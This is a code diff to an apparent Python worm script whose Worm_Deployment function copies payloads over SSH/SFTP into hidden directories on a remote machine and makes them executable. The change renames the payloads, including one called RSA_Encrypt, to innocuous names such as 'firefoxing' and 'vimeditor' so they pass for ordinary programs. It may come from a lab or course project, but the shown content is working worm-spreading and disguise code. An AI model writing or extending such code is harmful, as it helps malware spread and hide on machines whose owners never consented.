@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import sys
 import time
 import itertools
@@ -64,30 +65,27 @@ def Worm_Deployment(ssh):
     sftp = ssh.open_sftp()
     
     #sending Loop_ping
-    remotepath='/home/attacker/Desktop/.Backup/Loop_ping'
+    remotepath='/home/attacker/Desktop/.Backup/firefoxing'
     localpath='./Loop_ping'
     sftp.put(localpath,remotepath)
-    remotepath='/home/attacker/Public/.Simple_Worm/Loop_ping'
+    remotepath='/home/attacker/Public/.Simple_Worm/firefoxing'
     localpath='./Loop_ping'
     sftp.put(localpath,remotepath)
-    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/Loop_ping")
-    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/Loop_ping")
+    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/firefoxing")
+    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/firefoxing")
 
     #sending RSA_Encrypt
-    remotepath='/home/attacker/Desktop/.Backup/RSA_Encrypt'
+    remotepath='/home/attacker/Desktop/.Backup/vimeditor'
     localpath='./RSA_Encrypt'
     sftp.put(localpath,remotepath)
-    remotepath='/home/attacker/Public/.Simple_Worm/RSA_Encrypt'
+    remotepath='/home/attacker/Public/.Simple_Worm/vimeditor'
     localpath='./RSA_Encrypt'
     sftp.put(localpath,remotepath)
-    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/RSA_Encrypt")
-    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/RSA_Encrypt")
+    ssh.exec_command("chmod u+x /home/attacker/Desktop/.Backup/vimeditor")
+    ssh.exec_command("chmod u+x /home/attacker/Public/.Simple_Worm/vimeditor")
 
     #sending launch.py
-    remotepath='/home/attacker/Desktop/.Backup/launch.py'
-    localpath='./launch.py'
-    sftp.put(localpath,remotepath)
-    remotepath='/home/attacker/Public/.Simple_Worm/launch.py'
+    remotepath='/home/attacker/.attackrecord/launch.py'
     localpath='./launch.py'
     sftp.put(localpath,remotepath)
 
